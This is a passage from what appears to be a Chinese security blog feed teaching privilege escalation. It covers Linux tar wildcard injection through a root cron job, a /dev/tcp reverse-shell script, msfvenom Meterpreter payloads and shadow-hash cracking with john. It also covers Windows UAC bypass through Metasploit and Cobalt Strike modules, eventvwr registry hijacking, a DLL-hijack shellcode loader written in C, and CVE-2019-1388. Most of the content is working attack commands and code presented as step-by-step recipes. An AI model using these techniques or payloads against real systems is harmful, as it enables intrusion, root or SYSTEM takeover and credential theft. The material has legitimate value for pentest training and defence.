<strong>即创建的–help文件将–help命令劫持了</strong></p><p>如何利用这一点进行提权呢？</p><p><strong>如果有的命令的参数中可以去执行linux命令，我们进行劫持，达到提权的目的</strong>，我们以tar命令为例子 </p><p>tar命令是Linux中的压缩命令，可以对文件进行压缩</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czf <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.tgz</span> <span class="hljs-number">1</span><span class="hljs-selector-class">.html</span> 将文件<span class="hljs-number">1</span>.html文件压缩成<span class="hljs-selector-tag">html</span>.tgz<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110170320323.png" alt="image-20240110170320323"></p><p>也可以使用通配符进行压缩</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czf <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.tgz</span> *<span class="hljs-selector-class">.html</span> 将文件所有html文件压缩成<span class="hljs-selector-tag">html</span>.tgz<br></code></pre></td></tr></table></figure><p>在tar中有执行linux命令的参数如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">tar -czf 1.tgz 1.html <span class="hljs-attribute">--checkpoint</span>=1 <span class="hljs-attribute">--checkpoint-action</span>=exec=whoami<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110170423586.png" alt="image-20240110170423586"></p><p>可以对后面的命令进行劫持 ,只需要要编写一个这样的参数文件就行可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint=1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span> &gt; --checkpoint-action=<span class="hljs-built_in">exec</span>=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110170459127.png" alt="image-20240110170459127"></p><p>接着运行 </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czf <span class="hljs-selector-tag">html</span><span class="hljs-selector-class">.tgz</span> *<br></code></pre></td></tr></table></figure><img src="/img/image-20240110170600574.png" alt="image-20240110170600574" style="zoom:80%;" /> <h3 id="提权实验-3"><a href="#提权实验-3" class="headerlink" title="提权实验"></a>提权实验</h3><p>一般都有备份网站的习惯，那么运维人员或管理员填写了备份文件的计划任务任务，如果滥用了通配符，就可能导致提权</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">*<span class="hljs-regexp">/1 * * * * root tar -zcf /</span>var<span class="hljs-regexp">/html.tgz /</span>var<span class="hljs-regexp">/www/</span>html/*<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110170636346.png" alt="image-20240110170636346"></p><p>1.上线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.210.100.128 <span class="hljs-attribute">LPORT</span>=8889 -f elf &gt; 2.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.210.100.128<br><span class="hljs-built_in">set</span> lport 8889<br>run<br></code></pre></td></tr></table></figure><img src="/img/image-20240110170656754.png" alt="image-20240110170656754" style="zoom:80%;" /> <p>2.查看计划任务，发现有滥用通配符的，并且是root权限，可以进行提权</p><p><img src="/img/image-20240110170712146.png" alt="image-20240110170712146"></p><p>3.在&#x2F;var&#x2F;www&#x2F;html下创建两个文件如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>--checkpoint=<span class="hljs-number">1</span><br>echo <span class="hljs-string">&quot; &quot;</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>--checkpoint-action=exec=<span class="hljs-string">&#x27;bash shell.sh&#x27;</span><br>echo <span class="hljs-string">&quot;bash -i &gt;&amp;/dev/tcp/10.210.100..128/8888 0&gt;&amp;1&quot;</span> &gt; <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.sh<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110170752699.png" alt="image-20240110170752699"></p><p>4.使用NC进行监听，等待sh脚本被执行，连接NC</p><p><img src="/img/image-20240110170816097.png" alt="image-20240110170816097"></p><h2 id="7-破解明文密码提权"><a href="#7-破解明文密码提权" class="headerlink" title="7.破解明文密码提权"></a>7.破解明文密码提权</h2><h3 id="提权原理-5"><a href="#提权原理-5" class="headerlink" title="提权原理"></a>提权原理</h3><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。</p><p><strong>shadow是仅 root可读写的</strong>，当管理员的passwd和shadow一些权限配置不当就可能会导致提权</p><h3 id="提权环境-2"><a href="#提权环境-2" class="headerlink" title="提权环境"></a>提权环境</h3><p>主要是查看当前的shadow文件是否可以读取，主要有以下几种方式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、赋予了文件<span class="hljs-number">777</span>权限<br><span class="hljs-attribute">2</span>、可以使用sudo查看<br><span class="hljs-attribute">3</span>、cat等命令赋予了SUID权限<br></code></pre></td></tr></table></figure><h3 id="提权复现-1"><a href="#提权复现-1" class="headerlink" title="提权复现"></a>提权复现</h3><p>root的账号密码如何破解</p><p>1.能够读取到shadow文件</p><p><img src="/img/image-20240110171414303.png" alt="image-20240110171414303"></p><p>2.使用工具破解密码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">john <span class="hljs-attribute">--wordlist</span>=passwd.txt + shadow.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110171835109.png" alt="image-20240110171835109"></p>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>提权-windows绕过UAC提权</title>
    <link href="/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83/"/>
    <url>/2024/01/09/%E6%8F%90%E6%9D%83-windows%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h1><h2 id="UAC概述"><a href="#UAC概述" class="headerlink" title="UAC概述"></a>UAC概述</h2><p>UAC（User Account Control），中文翻译为用户帐户控制，是微软在Windows Vista和Windows7中 引用的新技术，<strong>主要功能是进行一些会影响系统安全的操作时，会自动触发UAC，用户确认后才能执行</strong>。因为大部分的恶意软件、木马病毒、广告插件在进入计算机时都会有如：将文件复制到Windows或 Program Files等目录、安装驱动、安装ActiveX等操作，而这些操作都会触发UAC，用户都可以在UAC 提示时来禁止这些程序的运行</p><p><strong>许可提示</strong>当用户尝试执行需要用户管理访问令牌的任务时，会显示同意提示。 下面是 UAC 同意提示的示例</p><img src="/img/image-20240109113933997.png" alt="image-20240109113933997" style="zoom:80%;" /> <p><strong>凭据提示</strong>当标准用户尝试执行需要用户管理访问令牌的任务时，会显示凭据提示。 还可以要求管理员提供其凭据</p><img src="/img/image-20240109114013972.png" alt="image-20240109114013972" style="zoom:67%;" /> <h3 id="UAC触发操作"><a href="#UAC触发操作" class="headerlink" title="UAC触发操作"></a>UAC触发操作</h3><p>UAC触发的条件如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">修改Windows <span class="hljs-keyword">Update</span>配置；<br>增加或删除用户帐户；<br>改变用户的帐户类型；<br>改变UAC设置；<br>安装ActiveX；<br>安装或卸载程序；<br>安装设备驱动程序；<br>修改和设置家长控制；<br>增加或修改注册表；<br>将文件移动或复制到<span class="hljs-keyword">Program</span> Files或是Windows目录；<br>访问其他用户目录<br></code></pre></td></tr></table></figure><p>UAC有用四种设置要求</p><p>简单来说，UAC设置分四种，分为始终通知、仅在程序尝试对我的计算机进行更改时通知我、仅当程序尝试更改计算机时通知我（不降低桌面亮度）和从不通知。</p><p>输入W+R –msconfig 设置UAC</p><p><img src="/img/image-20240109114330678.png" alt="image-20240109114330678"> </p><h2 id="MSF和CS绕过UAC的方法"><a href="#MSF和CS绕过UAC的方法" class="headerlink" title="MSF和CS绕过UAC的方法"></a>MSF和CS绕过UAC的方法</h2><h3 id="CS绕过UAC"><a href="#CS绕过UAC" class="headerlink" title="CS绕过UAC"></a>CS绕过UAC</h3><p>拿到一个普通管理员的SHELL,在CS中没有*号代表有UAC</p><p><img src="/img/image-20240109143102510.png" alt="image-20240109143102510"></p><p>使用CS自带的插件进行绕过</p><p><img src="/img/image-20240109143232503.png" alt="image-20240109143232503"> </p><p>成功绕过UAC</p><p><img src="/img/image-20240109143349971.png" alt="image-20240109143349971"></p><p>对比 ：</p><p>没有提权前，是没有权限的</p><p><img src="/img/image-20240109143422211.png" alt="image-20240109143422211"> </p><p>提权后：</p><p><img src="/img/image-20240109143626947.png" alt="image-20240109143626947"> </p><h3 id="MSF绕过UAC"><a href="#MSF绕过UAC" class="headerlink" title="MSF绕过UAC"></a>MSF绕过UAC</h3><h4 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h4><p>使用该模块提权的使用，当前用户必须是管理员组中的用户，UAC为默认设置 </p><p>生成一个MSF的SHELL</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span> LPORT=<span class="hljs-number">4567</span> -f exe -o payload.exe <span class="hljs-regexp">//</span>生成木马<br><br>use exploit<span class="hljs-regexp">/multi/</span>handler<br>set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>set lhost <span class="hljs-number">10.210</span>.<span class="hljs-number">100.128</span><br>set lport <span class="hljs-number">4567</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109144219683.png" alt="image-20240109144219683"> </p><p>试一下getsystem发现失败</p><p><img src="/img/image-20240109144241028.png" alt="image-20240109144241028"></p><p>搜索bypassuac模块</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109144549237.png" alt="image-20240109144549237"></p><p>尝试用第二个，设置参数 session然后run即可</p><p>getsystem</p><p><img src="/img/image-20240109144801842.png" alt="image-20240109144801842"></p><h4 id="RUNAS模块"><a href="#RUNAS模块" class="headerlink" title="RUNAS模块"></a>RUNAS模块</h4><p>该模块会创建一个可执行文件，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个system权限的shell</p><p>这个模块对用户没有要求，点击通过即可，但是会创建一个恶意文件，对该文件进行免杀即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>local/ask<br></code></pre></td></tr></table></figure><p>设置session然后run，目标机器会出现弹窗</p><p><img src="/img/image-20240109145007913.png" alt="image-20240109145007913"> </p><p>点击确定即可上线</p><p><img src="/img/image-20240109145205157.png" alt="image-20240109145205157"></p><h2 id="基于白名单AutoElevate绕过UAC"><a href="#基于白名单AutoElevate绕过UAC" class="headerlink" title="基于白名单AutoElevate绕过UAC"></a>基于白名单AutoElevate绕过UAC</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p><strong>利用白名单程序的本质实际上是劫持注册表,这种方法主要是通过寻找autoElevated属性为true的程序, 修改其注册表command的值,改成我们想要执行的paylaod</strong>,在该值中指明的字段会在这类程序运行时自动执行,类似于默认程序打开,当你以后运行该程序时,这个command命令都会自动执行。 </p><p>UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序 是安全的。因此，微软则在 UAC 中添加了白名单机制常见白名单如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msconfig<span class="hljs-selector-class">.exe</span><br>taskmgr<span class="hljs-selector-class">.exe</span><br>perfmon<span class="hljs-selector-class">.exe</span><br>cleanmgr<span class="hljs-selector-class">.exe</span><br>sdclt<span class="hljs-selector-class">.exe</span><br>dccw<span class="hljs-selector-class">.exe</span><br>eventvwr<span class="hljs-selector-class">.exe</span><br>computerdefaults<span class="hljs-selector-class">.exe</span><br>fodhelper.exe<br></code></pre></td></tr></table></figure><h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>我们在win7的系统下运行eventvwr.exe，使用Process Monitor监控该程序，发现 HKCU\Software\Classes\mscfile\shell\open\command 的值结果是没发现</p><p><img src="/img/image-20240109151353772.png" alt="image-20240109151353772"></p><p>由于这些注册表项不存在，用户可以在注册表中创建此结构，以便绕过用户账户控制 (UAC) 执行具有更 高权限的命令。</p><p><img src="/img/image-20240109151742393.png" alt="image-20240109151742393"></p><p>再次运行eventvwr.exe弹出计算机</p><p><strong><img src="/img/image-20240109151817727.png" alt="image-20240109151817727"></strong></p><p>也可以在命令行中执行添加操作（第二条最好添加上，不然可能不成功）：</p><p><img src="/img/image-20240109152150132.png" alt="image-20240109152150132"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /<span class="hljs-keyword">ve</span> /t REG_SZ /d <span class="hljs-string">&quot;cmd.exe /c calc&quot;</span><br><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /v DelegateExecute /t REG_SZ<br></code></pre></td></tr></table></figure><p>这虽然看起了还是普通用户，<strong>但是已经绕过了UAC可以执行命令了</strong>，接下来利用powershell控制台打开 cmd添加用户或者启用administrator，然后使用runas进行权限切换到administrator</p><h4 id="CS演示"><a href="#CS演示" class="headerlink" title="CS演示"></a>CS演示</h4><p><img src="/img/image-20240109152835067.png" alt="image-20240109152835067"></p><p>修改注册表</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /<span class="hljs-keyword">ve</span> /t REG_SZ /d <span class="hljs-string">&quot;C:\Users\r1cky\Desktop\artifact.exe&quot;</span><br><span class="hljs-keyword">reg</span> <span class="hljs-built_in">add</span> HKCU\Software\Classes\mscfile\<span class="hljs-keyword">shell</span>\<span class="hljs-keyword">open</span>\<span class="hljs-keyword">command</span> /v DelegateExecute /t REG_SZ<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109153222732.png" alt="image-20240109153222732"></p><p>执行eventvwr.exe成功绕过uac</p><p><img src="/img/image-20240109153332508.png" alt="image-20240109153332508"> </p><p><img src="/img/image-20240109153316717.png" alt="image-20240109153316717"></p><h2 id="基于白名单DLL劫持绕过UAC提权"><a href="#基于白名单DLL劫持绕过UAC提权" class="headerlink" title="基于白名单DLL劫持绕过UAC提权"></a>基于白名单DLL劫持绕过UAC提权</h2><h3 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h3><h4 id="DLL是什么"><a href="#DLL是什么" class="headerlink" title="DLL是什么"></a>DLL是什么</h4><p>dll为动态链接库文件，又称”应用程序拓展”，是软件文件类型。在Windows中许多应用程序并不是一个 完整的可执行文件，它们被分割成一些相对独立的动态链接库文件，即dll文件，放置于系统中，个人理 解类似于我们编程中引入的模块</p><h4 id="DLL提权原理"><a href="#DLL提权原理" class="headerlink" title="DLL提权原理"></a>DLL提权原理</h4><p><strong>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这 个DLL；</strong></p><p>如果<strong>攻击者能够控制其中的某一个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意 的DLL便会被进程所加载，从而造成代码执行</strong>。这就是所谓的DLL劫持</p><p>DLL的加载顺序如下</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">1</span>、应用程序加载的目录<br><span class="hljs-number">2</span>、C:<span class="hljs-string">\Windows\System32</span><br><span class="hljs-number">3</span>、C:<span class="hljs-string">\Windows\System</span><br><span class="hljs-number">4</span>、C:<span class="hljs-string">\Windows</span><br><span class="hljs-number">5.</span>加载 DLL 时所在的当前目录<br><span class="hljs-number">6.</span>PATH环境变量中列出的目录<br></code></pre></td></tr></table></figure><h3 id="Know-Dlls注册表项"><a href="#Know-Dlls注册表项" class="headerlink" title="Know Dlls注册表项"></a>Know Dlls注册表项</h3><p>从windows7之后，微软为了更进一步的防御系统的dll劫持，将一些容易被劫持的系统dll写进了一个注册表项中，那么凡<strong>是在此项目下的dll文件就会被禁止从exe自身所在目录下调用，而只能从系统目录即 system32目录下调用</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109155435105.png" alt="image-20240109155435105"></p><h3 id="提权环境"><a href="#提权环境" class="headerlink" title="提权环境"></a>提权环境</h3><p>当前采用win7系统，找到一个白名单的程序 SystemPropertiesAdvanced.exe 位置在 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 目录下，打开如下是windows的属性设置，通过进程监控找到加载的DLL文件进行劫持就可以提权</p><p>打开不需要uac认证</p><p><img src="/img/image-20240109160009574.png" alt="image-20240109160009574"></p><p>先将操作在本地执行，使用process monitor进行监控，过滤DLL和 NAME NOT FOUND ，寻找可以替换的DLL 文件，注意文件的权限是否可以在目录写入，</p><p>可以看到在C盘的tools目录的jdk文件中有一个srrstr.dll被 调用，但是没有加载，我们生成恶意的DLL文件看看是否可以被劫持</p><p><img src="/img/image-20240109161528487.png" alt="image-20240109161528487"></p><p>打开C语言编辑器生成DLL文件，进行弹出CMD窗口，或者打开计算器进行测试CPP文件内容如下</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-comment">/* Replace &quot;dll.h&quot; with the name of your header */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;windows.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;stdlib.h&gt;</span><br>BOOL WINAPI DllMain(<span class="hljs-keyword">HINSTANCE</span> hinstDLL,DWORD fdwReason,LPVOID lpvReserved)<br>&#123;<br><span class="hljs-keyword">switch</span>(fdwReason)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>)<span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>&#123;<br><span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span><span class="hljs-comment">;</span><br>&#125;<br>&#125;<br><span class="hljs-comment">/* Return TRUE on success, FALSE on failure */</span><br><span class="hljs-keyword">return</span> TRUE<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109161639947.png" alt="image-20240109161639947"></p><p>生成DLL文件并且，传到 C:\tools\jdk-11.0.11\bin\srrstr.dll 目录下，看看是否能劫持，并且绕 过UAC</p><img src="/img/image-20240109161707749.png" alt="image-20240109161707749" style="zoom:80%;" />  <p><img src="/img/image-20240109161721029.png" alt="image-20240109161721029"> </p><h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><p>利用CS上线进行劫持DLL提权绕过UAC认证</p><p>首先上线CS</p><p>使用CS生成shellcode，并且加载到DLL文件中，上传到目标系统中加载的代码如下</p><p><img src="/img/image-20240109162012993.png" alt="image-20240109162012993"> </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">/* Replace &quot;dll.h&quot; with the name of your header */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dll.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span>(__stdcall* JMP_SHELLCODE)();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[<span class="hljs-number">800</span>] = &#123;shellcode&#125;;<br><br>DWORD WINAPI jmp_shellcode(LPVOID pPara)<br>&#123;<br>LPVOID lpBase = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT,<br>PAGE_EXECUTE_READWRITE);<br>memcpy(lpBase, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>JMP_SHELLCODE jmp_shellcode = (JMP_SHELLCODE)lpBase;<br>jmp_shellcode();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">BOOL</span> WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)<br>&#123;<br><span class="hljs-keyword">switch</span>(fdwReason)<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br>hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, jmp_shellcode, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">/* Return TRUE on success, FALSE on failure */</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240109162402874.png" alt="image-20240109162402874"> </p><p>接下来运行白名单程序，可看待提权成功，绕过了UAC认证</p><p><img src="/img/image-20240109162520282.png" alt="image-20240109162520282"></p><h2 id="CVE-2019-1388-UAC提权"><a href="#CVE-2019-1388-UAC提权" class="headerlink" title="CVE-2019-1388 UAC提权"></a>CVE-2019-1388 UAC提权</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>CVE-2019-1388 UAC提权是一个Windows证书对话框特权提升漏洞，此漏洞是因为 UAC（用户账户控制）机制的设定不严导致的。默认情况下，</p><p><strong>Windows UAC 提示本身是由名为 consent.exe 的可执行文件生成的，该可执行文件以 NT AUTHORITY\SYSTEM 身份运行并且有 System 的完整性水平</strong>。</p><p><strong>即UAC的弹窗就是最高权限运行的</strong></p><p>由于用户可以与此UI 进行交互（点击是 否等），因此有必要对 UI 进行严格限制。否则，低特权用户可能能够通过UI操作提权到system权限</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>漏洞影响的版本如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span> server机器<br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2008</span>r2 <span class="hljs-number">7601</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2012</span>r2 <span class="hljs-number">9600</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2016</span> <span class="hljs-number">14393</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">2019</span> <span class="hljs-number">17763</span><br><br><span class="hljs-attribute">windows</span> 个人电脑<br><span class="hljs-attribute">Windows</span> <span class="hljs-number">7</span> SP1 <span class="hljs-number">7601</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">8</span> <span class="hljs-number">9200</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">8</span>.<span class="hljs-number">1</span> <span class="hljs-number">9600</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1511</span> <span class="hljs-number">10240</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1607</span> <span class="hljs-number">14393</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1703</span> <span class="hljs-number">15063</span><br><span class="hljs-attribute">Windows</span> <span class="hljs-number">10</span> <span class="hljs-number">1709</span> <span class="hljs-number">16299</span><br></code></pre></td></tr></table></figure><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果在运行一个可执行文件的时候我们触发了 UAC，在点击「显示有关此发步者的证书的信息」这个链 